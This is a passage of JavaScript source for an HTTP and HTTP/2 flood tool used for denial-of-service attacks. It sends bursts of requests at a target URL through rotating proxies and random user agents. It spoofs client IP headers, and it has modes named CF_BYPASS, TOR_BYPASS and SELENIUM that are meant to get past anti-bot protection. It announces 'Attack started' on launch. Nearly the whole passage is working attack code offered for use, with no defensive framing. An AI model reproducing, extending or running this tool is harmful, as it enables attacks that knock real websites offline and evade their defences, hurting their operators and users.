                "User-Agent": randomChoice(MagicData.NULL)
            },
        }

        attack.flood(socket, options, attack.rpc, attack.target, attack.custom_headers)
    }

    flood(socket, options, rpc = 100, target, custom_headers) {
        if (this.is_ip_spoof) {
            const spoofed_address = randomIPV4()
            options["headers"]["X-Forwarded-Proto"] = "Http"
            options["headers"]["X-Forwarded-Host"] = `${target.hostname}, 1.1.1.1`
            options["headers"]["Via"] = spoofed_address
            options["headers"]["Client-IP"] = spoofed_address
            options["headers"]["X-Forwarded-For"] = spoofed_address
            options["headers"]["Real-IP"] = spoofed_address
        }

        for (const key in custom_headers) {
            options["headers"][key] = custom_headers[key]
        }

        if (!this.is_http2) {
            options["headers"]["Host"] = target.host
            options["headers"]["Connection"] = "Keep-Alive"
            options["headers"]["Upgrade-Insecure-Requests"] = "1"

            const payload = build_payload(options)

            for (let i = 0; i < rpc; i++) {
                socket.write(randomize_payload(payload))
            }

            return
        }

        options["headers"][":path"] = options["path"]
        options["headers"][":method"] = options["method"]

        http2.connect(`${target["protocol"]}//${target.host}${options["path"]}`, {"createConnection": () => socket}, (session) => {
            for (let i = 0; i < rpc; i++) {
                const req = session.request(randomize_map(options["headers"]))
                    .on("response", () => req.close())

                if (options["data"]) {
                    req.setEncoding('utf8');
                    req.write(randomize_payload(options["data"]));
                }

                req.end()

            }
        })

    }

}


function parseHeader(value) {
    if (!value || value === "null") {
        return {}
    }
    return querystring.parse(Buffer.from(value, 'base64').toString('utf-8'))
}

function flood(args) {
    let target = args["target"];

    // noinspection JSUnresolvedFunction
    if (!args["target"].startsWith("http")) {
        // noinspection JSCheckFunctionSignatures
        target = Buffer.from(target, "base64").toString('utf-8')
    }

    // noinspection JSCheckFunctionSignatures
    target = parse(target);

    target.authority = target.hostname + (target.port ?
        ":" + target.port :
        target.protocol === "https:" ? ":443" : ":80")

    let path = target.path ?? "/"
    const methodName = args.method.toUpperCase();

    if (path.startsWith("?")) {
        path = "/" + path
    }

    fs.readFile("ua.txt", 'utf8', (err, data) => {
        if (err) throw err;

        let user_agents = Array()

        for (const ua of data.split("\n")) {
            user_agents.push(ua.trimEnd())
        }


        let max_proxy = "all"

        if (methodName === "CF_BYPASS" || methodName === "SELENIUM") {
            max_proxy = "https"
        }

        fs.readFile("proxies.txt", 'utf8', (err, data) => {
            let proxies = Array()

            const matches = data.matchAll(/(https?|socks[45](?:[A-z]+)?):\/\/(\S+):(\d+)/gm);

            for (const match of matches) {
                if (match[1] !== max_proxy && max_proxy !== "all") continue
                proxies.push(new Proxy(match[1], match[2], match[3]))
            }

            let custom_headers = {}
            const old_headers = parseHeader(args["headers"])

            for (const customHeader in old_headers) {
                custom_headers[customHeader] = old_headers[customHeader]
            }

            const custom_data = args["postdata"] !== "null" && args["postdata"] ?
                Buffer.from(args["postdata"], "base64").toString('utf-8') : "";

            if (custom_data) {
                if (!Object.hasOwn(custom_headers, "Content-Length")) {
                    custom_headers["Content-Length"] = randomize_payload(custom_data).length
                }
                if (!Object.hasOwn(custom_headers, "Content-Type")) {
                    custom_headers["Content-Type"] = detectEncoding(custom_data)
                }
            }

            const attack = new Attack(target,
                user_agents,
                args.rpc,
                args.request_type,
                path,
                custom_headers,
                custom_data,
                args["verbose"],
                args.http2,
                args["spoof"])

            const method = attack[methodName]

            // noinspection JSUnresolvedVariable
            if (cluster.isMaster) {
                let enabled_features = [methodName]

                if (args["spoof"]) {
                    enabled_features.push("SPOOFED")
                }

                if (args["http2"]) {
                    enabled_features.push("HTTP2")
                }

                console.log(`${colors.red("☠")} Attack started using ${colors.blue(`${proxies.length}[${max_proxy}]`)} proxies to ${colors.blue(target.href)} (${colors.blue(enabled_features.join(", "))})`)
            }

            if (args.http2) {
                tls.DEFAULT_MAX_VERSION = 'TLSv1.3';
            }

            if (methodName === "SELENIUM") {
                tls.DEFAULT_MIN_VERSION = "TLSv1.3";
            }

            if (["SELENIUM", "TOR_BYPASS"].includes(methodName)) {
                method(attack, proxies)
                return;
            }

            if (methodName === "CF_BYPASS") {
                setInterval(() => method(attack, randomChoice(proxies)))
                return;
            }


            const attack_config = {
                "tls": target.protocol === "https:",
                "http2": args.http2
            }

            setInterval(() => randomChoice(proxies).openConnection(target, attack_config, (socket) => method(attack, socket)))

        });
    })


}


main()
